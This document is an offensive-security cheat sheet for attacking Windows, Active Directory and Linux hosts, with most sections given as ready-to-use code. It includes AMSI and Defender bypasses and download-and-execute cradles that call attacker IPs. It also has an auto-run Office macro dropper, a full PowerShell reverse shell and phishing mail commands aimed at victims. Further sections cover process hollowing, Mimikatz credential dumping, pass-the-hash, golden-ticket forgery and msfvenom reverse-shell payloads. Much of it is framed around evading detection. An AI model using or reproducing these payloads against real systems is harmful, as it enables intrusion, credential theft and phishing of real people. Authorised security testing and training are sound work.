[Sharploader]('https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader')

- First, encrypt all your csharp files on the attacker machine using invoke-sharpencrypt.
- Second, places all your encrypted files on your apache server.
- Third, create a powershell script using the amsi string below.
- Fourth, Run the amsi script inside the powershell cradle. Finally, Run Invoke-sharploader inside a powershell cradle.

<br>

### 1/2

```csharp
Invoke-SharpEncrypt -file C:\Path\to\file.exe -password SuperDumperStrongPassword -outfile C:\Path\to\file.enc
```
<br>

### 3

```powershell
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
```
<br>

### 3

```powershell
iex(new-object net.webclient).downloadstring('http://192.168.1.10/amsi.ps1')
```
<br>

### 4

```powershell
iex(new-object net.webclient).downloadstring('http://192.168.1.10/Invoke-SharpLoader.ps1');Invoke-SharpLoader -location https://192.168.1.10/runner.enc -password SuperDumperStrongPassword -noArgs
```
<br>
<br>

# Javascript

## Download&Execute

```javascript
var url = "http://YOUR_SERVER/YOUR.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("YOUR.exe");
```
<br>
<br>


# Phishing

Reference:
	- [Office](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Office%20-%20Attacks.md#docm---macro-creator)

## Macro

- ### Obfuscate however you want
- This macro is now detected as for the .bat and .txt they are still good to go as of 20FEB2022

```
Sub rev()

    Dim str As String
    str = "powershell -c Start-bitstransfer -source http://ip:port/revsh.bat -destination c:\\path\of\your choice\"
    Shell str, vbHide
    Dim revshell As String
    revshell = "c:\\path\of\transfered\file"
    Shell revshell, vbHide
    
End Sub

Sub Document_Open()
    rev
End Sub

Sub AutoOpen()
    rev
End Sub

Sub Auto_Open()
    rev
End Sub••••ˇˇˇˇ
```

## Reverse Shell

- ### Replace ip/port, save as .txt file and host on your server

```powershell
function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
// Setup IPADDR
$address = '192.168.1.13'
// Setup PORT
$port = '4242'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}
```


## Deploy
```
swaks --body 'click me http://192.168.X.X/file.hta' --add-header
"Really: 1.0" --add-header "Content-Type: text/html" --header
"Subject: Important" -t victim@corp.com -f attacker@corp.com --server
192.168.X.X
```
<br>

 ```
 sendmail -f attacker@email.com -t victim@email.com -s 192.168.x.x -u "Subject" -m "body"
```

## Bringing it home

- ### Save file as .bat and host on your server

```
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/ps.txt')"
```

```
When the macro is clicked it will first download the .bat file and execute.
Then the .bat file will download and execute your .txt file resulting in a revshell
```



# Powershell
<br>

## Download_file:
```
(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
```

 <br>
 
## Powershell_Cradle:

```
iex(new-object net.webclient).downloadstring('http://192.168.49.68/<ToolName>.ps1')
```

<br>

## Constrained_lang_mode:

```
$ExecutionContext.SessionState.LanguageMode
```
<br>

## CLM_Bypass:

```
Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\bypass-clm.exe"
```
<br>

## Disable_Restricted_Admin:

```powershell
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
DisableRestrictedAdmin
```
<br>
<br>

## Disable_AMSI
 <br>
 
 ### Method 1:
```
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
```
<br>

### Method 2:
```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```
<br>

### Method 3:
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);

```
<br>
<br>

## Load_assembly_reflectively:

## Download and run assembly without arguments
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()
```
<br>

## Download and run Rubeus, with arguments (make sure to split the args)
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```
<br>

## Execute a specific method from an assembly (e.g. a DLL)
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```
<br>
<br>

# Active_Directory

[Cheatsheet 1](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)

[Cheatsheet 2](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)

[Cheatsheet 3](https://book.hacktricks.xyz/windows/active-directory-methodology)

[Cheatsheet 4](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

<br>
<br>


# Windows

### Useful links

[Windows Priv esc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#applocker-enumeration)

[lolbas](https://lolbas-project.github.io/#)

```
Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\payload.exe"
```
<br>

#### Open powershell as Administrator
```
start-process powershell -verb runas
```
<br>

#### Add Defender Exclusion area
```
Add-MpPreference -ExclusionPath C:\temp, C:\
```

<br>
### Remove definitions
```
C:\Program Files\Windows Defender>.\MpCmdRun.exe -removedefinitions -all
```
<br>

### Disable Defender / Firewall
```powershell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true 
NetSh Advfirewall set allprofiles state off
```
<br>
<br>

# Linux

### Useful links

[Linux Priv esc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 
 ### Full TTY:
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ^Z
 stty raw -echo && fg
 reset
 ```
<br>
<br>

# Impacket 
[Cheatsheet 1](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/)

[Cheatsheet 2](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

[Cheatsheet 3](https://www.puckiestyle.nl/impacket/)
<br>
<br>


# TortugaToolKit

### Load DLL Remote:

```powershell
$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolkit.dll -UseBasicParsing).Content);
Import-Module -Assembly $a
```

<br>

### Load DLL local:

```powershell
$a=[System.Reflection.Assembly]::Load($(C:\Path\To\DLL); import-module -assembly $a
```

<br>

### Remote load&encrypt&processhollow:

```powershell
$code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
INVPH -encsh $code.encryptedShellcode -k $code.encryptionKey -ivk $code.initVectorKey -pn 'svchost.exe' -Verbose
```

<br>

### Impersonating process token&processhollow:

```powershell
$code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
```

```powershell
Invoke-ImpersonateProcessHollow -processId 1092 -exe "svchost.exe" -decryptKey $code.encryptionKey -shellCode $code.encryptedShellcode -initVector $code.initVectorKey
```
 
 <br>

- ### Disable AMSI:

```
Disable-AyEmEsEye -verbose
```
<br>

- ### Disable Defender:

```
Disable-DefenderForEndpoint
```
<br>

- ### Cmdlets

```powershell
Disable-AyEmEsEye
Disable-DefenderForEndpoint
Disable-Etw
Enable-DefenderForEndpoint
Enable-Privileges
Get-ActiveDirectoryComputers
Get-ActiveDirectoryForests
Get-ActiveDirectoryGroupMembership
Get-ActiveDirectoryGroups
Get-ActiveDirectoryUsers
Get-CurrentIdentity
Get-MsSQLQuery
Get-SQLInfo
Get-System
Get-TrustedInstaller
Invoke-UnhookDll
Invoke-AdminCheck
Invoke-AssemblyLoader
Invoke-ClassicInjection
Invoke-FileLessLateralMovement
Invoke-LsaSecretsDmp
Invoke-MsSQLAssembly
Invoke-MsSQLShell
Invoke-PingSweep
Invoke-ProcessHollow
Invoke-ShellcodeEncryption
Invoke-TokenStealer
Invoke-TurtleDump
Invoke-TurtleHound
Invoke-TurtleUp
Invoke-TurtleView
Invoke-ImpersonateProcessHollow
Invoke-ImpersonateToken
Show-AvailableTokens
Undo-Impersonation
```
<br>
<br>

# PowerUpSQL


[Cheatsheet 1](https://github.com/tacom6/PowerUpSQL/blob/master/PowerUpSQL-CheatSheet.md)

[Cheatsheet 2](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

[Cheatsheet 3](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

<br>
<br>

# MimiKatz

- ### general
```
privilege::debug
log
log customlogfilename.log
```

- ### sekurlsa
```
sekurlsa::logonpasswords
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

- ### kerberos
```
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

- ### crypto
```
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
crypto::keys /machine /export
```

 - ### vault & lsadump
```
vault::cred
vault::list
token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```

- ### pth
```
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe
```


- ### ekeys
```
sekurlsa::ekeys
```

- ### dpapi
```
sekurlsa::dpapi
```

- ### minidump
```
sekurlsa::minidump lsass.dmp
```

- ### ptt
```
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
```

- ### golden/silver
```
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
```

- ### tgt
 ```
kerberos::tgt
```
- ### purge
```
kerberos::purge
```
<br>
<br>

# Rubeus

[Cheatsheet 1](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

[Cheatsheet 2](https://github.com/GhostPack/Rubeus)

[Cheatsheet 3](https://www.puckiestyle.nl/kerberos-cheatsheet/)
<br>
<br>
# Metasploit

```
sudo msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.x.x lport=8080 EXITFUNC=thread -f csharp
```

```
sudo msfconsole -qx "use exploit/multi/handler ;set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
```

```
sudo msfconsole -qx "use exploit/multi/handler ;set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
```

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
```

```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f elf -o lin-4444
```

```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
```

```
msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f elf -o lin-4444
```

<br>
<br>

### autorun

```
post/multi/manage/autoroute
set session x
run

auxiliary/server/socks_proxy
```


<br>
<br>

# Tools

[SharpKatz](https://github.com/b4rtik/SharpKatz)

[SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)

[GhostPack](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

[SharpSploitConsole](https://github.com/anthemtotheego/SharpSploitConsole)

[SeatBelt](https://github.com/GhostPack/Seatbelt)

[Winpwn](https://github.com/S3cur3Th1sSh1t/WinPwn)

[SCShell](https://github.com/Mr-Un1k0d3r/SCShell)

[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)

[SharpImpersonation](https://github.com/S3cur3Th1sSh1t/SharpImpersonation)

[SharpCradle](https://github.com/anthemtotheego/SharpCradle)

[SharpMove](https://github.com/0xthirteen/SharpMove)

[Chameleon](https://github.com/klezVirus/chameleon)

[DotNetToJScript](https://github.com/tyranid/DotNetToJScript)

[ISESteroids](https://powershell.one/isesteroids/quickstart/install)

[Nishang](https://github.com/samratashok/nishang)

[PPLKiller](https://github.com/Mattiwatti/PPLKiller)

[Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)

[Neo-ConfuserEX](https://github.com/XenocodeRCE/neo-ConfuserEx)

[Bypass-CLM](https://github.com/calebstewart/bypass-clm)

[BloodHound](https://github.com/BloodHoundAD/BloodHound)

[LAPSToolKit](https://github.com/leoloobeek/LAPSToolkit)

[PSPY](https://github.com/DominicBreuker/pspy)

[LSE](https://github.com/diego-treitos/linux-smart-enumeration)

[HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)

[Chisel](https://github.com/jpillora/chisel)

[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

[DAMP](https://github.com/HarmJ0y/DAMP)

[SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC)

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

[PrintNightmare](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)

[SpoolSample](https://github.com/leechristensen/SpoolSample)

[Impacket](https://github.com/SecureAuthCorp/impacket)

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

[Rubeus](https://github.com/GhostPack/Rubeus)

[MimiKatz](https://github.com/ParrotSec/mimikatz)

[Powermad](https://github.com/Kevin-Robertson/Powermad)

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
